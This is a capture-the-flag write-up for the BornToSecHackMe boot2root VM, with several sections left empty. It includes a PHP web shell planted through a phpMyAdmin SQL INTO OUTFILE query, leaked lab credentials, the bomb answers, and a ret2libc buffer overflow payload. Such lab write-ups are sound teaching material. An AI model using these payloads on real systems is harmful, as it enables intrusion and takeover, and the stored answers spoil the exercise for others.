# Writeup 1

## Step 1 - Nmap

We don't see the ip of the boot2root vm, so we have to find it on our network.
We get the **ip address** of **our computer** and the **netmask of the network** with **ifconfig**:

```sh
➜  boot2root ifconfig               
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.128  netmask 255.255.255.0  broadcast 192.168.1.255
```

We then do a **ping scan** on the **home network** with nmap, and we can see the ip of the boot2root vm. We then do a **port scan** on **its ip address**:
```sh
➜  boot2root nmap -sn 192.168.1.128/24    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 16:39 CET
[...]
Nmap scan report for 192.168.1.76
Host is up (0.00079s latency).
[...]
➜  boot2root nmap -Pn 192.168.1.76
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 16:40 CET
Nmap scan report for 192.168.1.76
Host is up (0.00037s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

So we can see that there **6 open ports**: one for **ftp**, one for **ssh**, two for **http and https**, meaning there is a **webserver**, and 2 for **imap and imaps**, handling the **webmail.**

---

## Step 2 - Dirb

Now that we know that there is a **webserver**, we use **dirb** to test the possible urls on the https://ip-address, and we find out some interesting ones:

```bash
➜  boot2root dirb https://192.168.1.76

---- Scanning URL: https://192.168.1.76/ ----
==> DIRECTORY: https://192.168.1.76/forum/
==> DIRECTORY: https://192.168.1.76/phpmyadmin/
==> DIRECTORY: https://192.168.1.76/webmail/

---- Entering directory: https://192.168.1.76/forum/ ----
==> DIRECTORY: https://192.168.1.76/forum/images/
==> DIRECTORY: https://192.168.1.76/forum/includes/
==> DIRECTORY: https://192.168.1.76/forum/js/
==> DIRECTORY: https://192.168.1.76/forum/lang/
==> DIRECTORY: https://192.168.1.76/forum/modules/
==> DIRECTORY: https://192.168.1.76/forum/templates_c/
==> DIRECTORY: https://192.168.1.76/forum/themes/
==> DIRECTORY: https://192.168.1.76/forum/update/

---- Entering directory: https://192.168.1.76/phpmyadmin/ ----
==> DIRECTORY: https://192.168.1.76/phpmyadmin/js/
==> DIRECTORY: https://192.168.1.76/phpmyadmin/locale/
==> DIRECTORY: https://192.168.1.76/phpmyadmin/themes/

---- Entering directory: https://192.168.1.76/webmail/ ----
==> DIRECTORY: https://192.168.1.76/webmail/config/
==> DIRECTORY: https://192.168.1.76/webmail/images/
==> DIRECTORY: https://192.168.1.76/webmail/plugins/
==> DIRECTORY: https://192.168.1.76/webmail/src/
==> DIRECTORY: https://192.168.1.76/webmail/themes/
```

---

## Step 3 - Forum  

We go on the forum page (https://192.168.1.76/forum/), running on mylittleforum, and we can see several threads. In the **"Probleme login ?"** one, by lmezard, we can see some **logs**.  
If we look into them, at some point we can see a **clear password** in the login section, and an authenticated session right after:

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
[...]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

So we try to **log in the forum** as the user **lmezard** with the **!q\]Ej?\*5K5cy\*AJ** password, and it works.

---

## Step 4 - Webmail

When we go on the profile of lmezard, we can see an **email address**:
```
laurie@borntosec.net 
```

We try to **log in the webmail** (https://192.168.1.76/webmail/) with this email address and the password from the logs, and we get access to the user's mailbox.
There, we find an email named **DB Access** with **a root user and a password**:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

So we can suppose we can use those credentials to get access to the phpmyadmin database as root.

---

## Step 5 - Phpmyadmin

We log on the https://192.168.1.76/phpmyadmin page with those credentials, and we get access to the database as root.

After searching for a bit, we can see that there is a feature that allows us to run SQL queries in the SQL section of the databases.

We found this query that allows us to open a shell in the browser:
```SQL
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/payload.php'
```

But if we try to execute it, we get an error specifying us that we don't have the rights to create/write on this file. 

So we need to find a file or folder where we have the write/create rights. When we look at the dirb results earlier, we have a list of potential folders where we could have those rights.

When we look at the admin update page in the forum (after giving lmezard the admin rights on the BDD), or when we read the installation process of mylittleforum on github (https://github.com/ilosuna/mylittleforum), we can see that the folder **templates_c** is supposed to have these rights:

```
the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) 
```

We see it on the dirb results too, so we use it in our query:

```SQL
SELECT [...]
INTO OUTFILE '/var/www/forum/templates_c/payload.php'
```

The SQL query works, and when we go at the address https://192.168.1.76/forum/templates_c/payload, we can see that it opens an interactive shell.

---

## Step 6 - User www-data

In the interactive shell, we can see that **we are the user www-data**, and when we list the files in the **/home** folder, we see a folder named **LOOKATME** owned by the www-data user.

```
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
```

There is a file named **password** in this folder, which holds:

```
lmezard:G!@M6f4Eatau{sF"
```

However when we look at the **sshd_config** file, we can see that there are **only 4 users allowed** to connect in ssh, and lmezard is not one of them.

```
AllowUsers ft_root zaz thor laurie
```

---

## Step 7 - FTP

We try those credentials on the 21 port, used for FTP and it works.


---

## Step 8 - Laurie / The Bomb


### Phase 1

### Phase 2

### Phase 3

### Phase 4

### Phase 5

### Phase 6

### Result

```
PHASE 1: Public speaking is very easy.
PHASE 2: 1 2 6 24 120 720
PHASE 3: 1 b 214
PHASE 4: 9
PHASE 5: opekmq / opekma
PHASE 6: 4 2 6 3 1 5

Publicspeakingisveryeasy.126241207201b2149opekmq426315
```

This password doesn't work, and according to slack, we need to change `n-1` with `n-2`, so the password is: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

---

## Step 9 - Thor / Turtle


zaz password:

---

## Step 10 - Zaz / Exploit-me

We can see a binary called 
https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find 0xb7e6b060, +9999999, "/bin/sh"
0xb7f8cc58

```

```
zaz@BornToSecHackMe:~$ python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"' > test
zaz@BornToSecHackMe:~$ ./exploit_me $(cat test)
```
